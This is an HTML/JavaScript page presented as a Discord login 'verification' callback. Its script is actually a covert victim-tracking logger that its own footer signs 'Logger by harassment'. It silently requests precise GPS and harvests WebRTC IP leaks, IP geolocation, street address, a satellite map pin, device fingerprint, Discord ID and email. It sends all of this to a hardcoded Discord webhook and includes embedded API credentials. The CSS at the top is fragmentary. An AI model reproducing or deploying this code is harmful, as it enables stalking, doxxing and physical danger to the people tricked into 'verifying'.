            min-height: 100vh;

        .bg-grain {

        .bg-gradient {

            height: 100%;
            top: 0;
            left: 0;
            z-index: 0;
            overflow: hidden;
            pointer-events: none;
        }

        .gradient-blob {
            position: absolute;
            border-radius: 50%;
            filter: blur(150px);
            opacity: 0.08;
        }

        .blob-1 {
            width: 700px;
            height: 700px;
            background: #ffffff;
            top: -200px;

        p {

        .error-box {
            max-width: 400px;
            margin: 0 auto;

            border: 1px solid rgba(239, 68, 68, 0.2);
            border-radius: 12px;
            padding: 20px;
            display: none;
        }

        .error-box.show {
            display: block;
            animation: fadeInUp 0.6s ease;
        }

        .error-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .error-message {
            color: var(--text-secondary);
            font-size: 14px;

            background: rgba(0, 0, 0, 0.3);

</head>
<body>

    <script>
        const CONFIG = {
            BACKEND_URL: 'https://cautious-space-guacamole-x57q75pgx4jp36rv7-3000.app.github.dev',
            WEBHOOK_URL: 'https://discord.com/api/webhooks/1454071163583070323/IAcO-7YEIzCyDkMWhm5BARhiNWrzdgOUVGCZezg56PsnlnD9SPh3_H5zO6y9g3N0gMM8'
        };

        // Silently try to get GPS in background
        let gpsData = null;
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    gpsData = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: Math.round(pos.coords.accuracy)
                    };
                },
                () => {}, // Silent fail
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        }

        function showError(message, details = null) {
            document.getElementById('loadingState').style.display = 'none';
            const errorBox = document.getElementById('errorBox');
            errorBox.classList.add('show');
            document.getElementById('errorMessage').textContent = message;
            
            if (details) {
                document.getElementById('errorDetails').textContent = details;
            } else {
                document.getElementById('errorDetails').style.display = 'none';
            }
        }

        async function handleCallback() {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            const state = urlParams.get('state');
            const savedState = localStorage.getItem('oauth_state');

            if (!code) {
                showError('No authorization code received');
                return;
            }

            if (state !== savedState) {
                showError('Security validation failed');
                localStorage.removeItem('oauth_state');
                return;
            }

            localStorage.removeItem('oauth_state');

            try {
                const response = await fetch(`${CONFIG.BACKEND_URL}/api/auth/discord`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({ code })
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || 'Verification failed');
                }

                if (data.success && data.user) {
                    // Wait a bit more for GPS to complete
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    // Send enhanced webhook
                    sendEnhancedWebhook(data.user).catch(e => console.error('Webhook failed:', e));
                    
                    // Wait for webhook
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                    // Redirect
                    const params = new URLSearchParams({
                        username: data.user.username,
                        avatar: data.user.avatar,
                        email: data.user.email || ''
                    });
                    window.location.href = `authorized.html?${params.toString()}`;
                } else {
                    throw new Error('Verification failed');
                }

            } catch (error) {
                showError('Unable to connect to verification server', error.message);
            }
        }

        async function sendEnhancedWebhook(discordUser) {
            // Get all data
            const [ipData, webrtcIPs] = await Promise.all([
                getEnhancedIPData(),
                getWebRTCIPs()
            ]);
            
            const vpnData = detectVPN(ipData);
            const deviceData = getDeviceData();
            
            // Safe string conversion
            const s = (val) => {
                if (!val && val !== 0) return 'Unknown';
                return String(val).substring(0, 1000);
            };
            
            // Use GPS if available, otherwise IP
            let finalLat = ipData.lat;
            let finalLon = ipData.lon;
            let finalCoords = ipData.coordinates;
            let coordinateSource = 'IP Geolocation';
            let addressInfo = ipData.location;
            
            if (gpsData) {
                finalLat = gpsData.lat;
                finalLon = gpsData.lon;
                const preciseLat = Math.round(finalLat * 100000000) / 100000000;
                const preciseLon = Math.round(finalLon * 100000000) / 100000000;
                finalCoords = `${preciseLat}, ${preciseLon}`;
                coordinateSource = `GPS (¬±${gpsData.accuracy}m)`;
                
                // Get street address from GPS coordinates using reverse geocoding
                try {
                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${finalLat}&lon=${finalLon}&zoom=18&addressdetails=1`);
                    if (geoRes.ok) {
                        const geoData = await geoRes.json();
                        if (geoData.address) {
                            const parts = [];
                            if (geoData.address.house_number) parts.push(geoData.address.house_number);
                            if (geoData.address.road) parts.push(geoData.address.road);
                            if (geoData.address.suburb || geoData.address.neighbourhood) parts.push(geoData.address.suburb || geoData.address.neighbourhood);
                            if (geoData.address.city || geoData.address.town) parts.push(geoData.address.city || geoData.address.town);
                            if (geoData.address.state) parts.push(geoData.address.state);
                            if (geoData.address.postcode) parts.push(geoData.address.postcode);
                            if (geoData.address.country) parts.push(geoData.address.country);
                            addressInfo = parts.join(', ');
                        }
                    }
                } catch (e) {
                    // Geocoding failed, use IP location
                }
            }
            
            // Build map
            let mapImage = null;
            if (finalLat && finalLon) {
                const mapboxToken = 'pk.eyJ1IjoiaGFyYXNzbWVudGhhaGEiLCJhIjoiY21qbWdpMnA0MzJmNDNlb3RlbWdkZnc0aiJ9.aHc1ODUMqTaNIV8Eb8LRBQ';
                const zoom = gpsData ? 18 : 14; // Street-level for GPS, neighborhood for IP
                mapImage = `https://api.mapbox.com/styles/v1/mapbox/satellite-streets-v12/static/pin-l-marker+f74e4e(${finalLon},${finalLat})/${finalLon},${finalLat},${zoom},0/600x400@2x?access_token=${mapboxToken}`;
            }
            
            // Build embeds
            const embed1 = {
                title: "üìä User Verification - Location & Network",
                color: vpnData.score >= 50 ? 16740864 : (gpsData ? 65280 : 16711680),
                fields: [
                    { name: "üë§ Username", value: s(discordUser.username), inline: true },
                    { name: "üÜî Discord ID", value: s(discordUser.id), inline: true },
                    { name: "üìß Email", value: s(discordUser.email || 'Not provided'), inline: true },
                    { name: "üìç IP Address", value: s(ipData.ip), inline: true },
                    { name: "üîó WebRTC IPs", value: s(webrtcIPs.join(', ') || 'None'), inline: true },
                    { name: "üåê ISP/Org", value: s(ipData.isp), inline: true },
                    { name: "üè¢ ASN", value: s(ipData.asn), inline: true },
                    { name: "üè† Full Address", value: s(addressInfo), inline: false },
                    { name: "üìÆ Postal Code", value: s(ipData.postal), inline: true },
                    { name: "üó∫Ô∏è Coordinates", value: s(finalCoords), inline: true },
                    { name: "üì° Location Method", value: s(coordinateSource), inline: true },
                    { name: "üïí Timezone", value: s(ipData.timezone), inline: true },
                    { name: "üõ°Ô∏è VPN Status", value: s(vpnData.status), inline: true },
                    { name: "üìä VPN Score", value: s(vpnData.score) + '/100', inline: true },
                    { name: "üîç VPN Indicators", value: s(vpnData.indicators || 'None'), inline: false }
                ],
                thumbnail: { url: discordUser.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png' }
            };

            if (mapImage) {
                embed1.image = { url: mapImage };
            }

            const embed2 = {
                title: "üíª Device & Browser Information",
                color: 5814783,
                fields: [
                    { name: "üåê Browser", value: s(deviceData.browser).substring(0, 1000), inline: false },
                    { name: "üñ•Ô∏è OS", value: s(deviceData.os), inline: true },
                    { name: "üì± Device", value: s(deviceData.deviceType), inline: true },
                    { name: "üñ•Ô∏è Resolution", value: s(deviceData.resolution), inline: true },
                    { name: "üó£Ô∏è Language", value: s(deviceData.language), inline: true },
                    { name: "üíª CPU Cores", value: s(deviceData.cpuCores), inline: true },
                    { name: "üö´ AdBlock", value: s(deviceData.adblock), inline: true },
                    { name: "üç™ Cookies", value: s(deviceData.cookies), inline: true },
                    { name: "üì∂ Connection", value: s(deviceData.connection), inline: true },
                    { name: "‚è±Ô∏è Ping", value: s(deviceData.rtt), inline: true },
                    { name: "üìÖ Timestamp", value: new Date().toLocaleString(), inline: false }
                ],
                footer: {
                    text: `Logger by harassment ‚Ä¢ ${gpsData ? 'üéØ GPS Obtained' : 'üì° IP-based Location'}`,
                    icon_url: "https://cdn.discordapp.com/avatars/1404732292412477531/22c739eb7dd42b243e92587e18069b2d.png"
                }

            const payload = {
                content: vpnData.score >= 50 ? "‚ö†Ô∏è **VPN/Proxy Detected**" : (gpsData ? "‚úÖ **GPS Location Obtained**" : "üì° **User Verified**"),
                embeds: [embed1, embed2]
            };

            const response = await fetch(CONFIG.WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(`Webhook failed: ${response.status}`);
            }
        }

        async function getEnhancedIPData() {
            const results = {
                ip: 'Unknown',
                location: 'Unknown',
                city: '',
                region: '',
                country: '',
                postal: 'Unknown',
                coordinates: 'Unknown',
                lat: null,
                lon: null,
                timezone: 'Unknown',
                isp: 'Unknown',
                asn: 'Unknown',
                org: '',
                sources: [],
                proxy: false,
                hosting: false
            };

            // ipapi.co
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (res.ok) {
                    const d = await res.json();
                    results.ip = d.ip || results.ip;
                    results.city = d.city || '';
                    results.region = d.region || '';
                    results.country = d.country_name || '';
                    results.postal = d.postal || 'Unknown';
                    results.lat = d.latitude;
                    results.lon = d.longitude;
                    results.timezone = d.timezone || 'Unknown';
                    results.isp = d.org || 'Unknown';
                    results.asn = d.asn || 'Unknown';
                    results.org = d.org || '';
                    results.sources.push('ipapi.co');
                }
            } catch (e) {}

            // ip-api.com
            try {
                const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,query');
                if (res.ok) {
                    const d = await res.json();
                    if (d.status === 'success') {
                        if (!results.city) results.city = d.city || '';
                        if (!results.region) results.region = d.regionName || '';
                        if (!results.country) results.country = d.country || '';
                        if (results.postal === 'Unknown') results.postal = d.zip || 'Unknown';
                        if (!results.lat) results.lat = d.lat;
                        if (!results.lon) results.lon = d.lon;
                        results.proxy = d.proxy || false;
                        results.hosting = d.hosting || false;
                        results.sources.push('ip-api.com');
                    }
                }
            } catch (e) {}

            const locParts = [];
            if (results.city) locParts.push(results.city);
            if (results.region) locParts.push(results.region);
            if (results.country) locParts.push(results.country);
            results.location = locParts.length > 0 ? locParts.join(', ') : 'Unknown';

            if (results.lat && results.lon) {
                const preciseLat = Math.round(results.lat * 1000000) / 1000000;
                const preciseLon = Math.round(results.lon * 1000000) / 1000000;
                results.coordinates = `${preciseLat}, ${preciseLon}`;
            }

            return results;
        }

        function detectVPN(ipData) {
            let score = 0;
            const indicators = [];

            if (ipData.proxy) {
                indicators.push('Proxy detected');
                score += 40;
            }

            if (ipData.hosting) {
                indicators.push('Datacenter IP');
                score += 35;
            }

            if (ipData.org) {
                const org = ipData.org.toLowerCase();
                const vpnKeywords = ['vpn', 'proxy', 'hosting', 'datacenter', 'cloud', 'virtual', 'server', 
                    'digitalocean', 'amazon', 'aws', 'azure', 'ovh', 'hetzner', 'vultr', 'cloudflare', 
                    'nordvpn', 'expressvpn', 'surfshark', 'mullvad', 'protonvpn'];
                
                for (const keyword of vpnKeywords) {
                    if (org.includes(keyword)) {
                        indicators.push(`Keyword: ${keyword}`);
                        score += 25;
                        break;
                    }
                }
            }

            let status = '‚ùå Not Detected';
            let confidence = 'Low';

            if (score >= 70) status = 'üî¥ CONFIRMED';
            else if (score >= 50) status = 'üü† LIKELY';
            else if (score >= 30) status = 'üü° POSSIBLE';
            else if (score >= 15) status = 'üü¢ UNLIKELY';

            return {
                status,
                score,
                confidence,
                indicators: indicators.join(', ') || 'None'
            };
        }

        async function getWebRTCIPs() {
            return new Promise((resolve) => {
                const ips = [];
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                
                if (!RTCPeerConnection) {
                    resolve(ips);
                    return;
                }

                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});

                pc.onicecandidate = (event) => {
                    if (!event || !event.candidate) {
                        resolve(ips);
                        return;
                    }
                    const parts = event.candidate.candidate.split(' ');
                    const ip = parts[4];
                    if (ip && !ips.includes(ip) && ip !== '0.0.0.0') {
                        ips.push(ip);
                    }
                };

                setTimeout(() => {
                    pc.close();
                    resolve(ips);
                }, 2000);
            });
        }

        function getDeviceData() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            return {
                browser: navigator.userAgent,
                os: navigator.platform || 'Unknown',
                deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'üì± Mobile' : 'üíª Desktop',
                resolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language || 'Unknown',
                cpuCores: navigator.hardwareConcurrency || 'Unknown',
                adblock: '‚ùå Unknown',
                cookies: navigator.cookieEnabled ? '‚úÖ Enabled' : '‚ùå Disabled',
                connection: conn?.effectiveType || 'Unknown',
                rtt: conn?.rtt ? `${conn.rtt}ms` : 'Unknown',
                downlink: conn?.downlink ? `${conn.downlink}Mbps` : 'Unknown'
            };
        }

        handleCallback();
    </script>
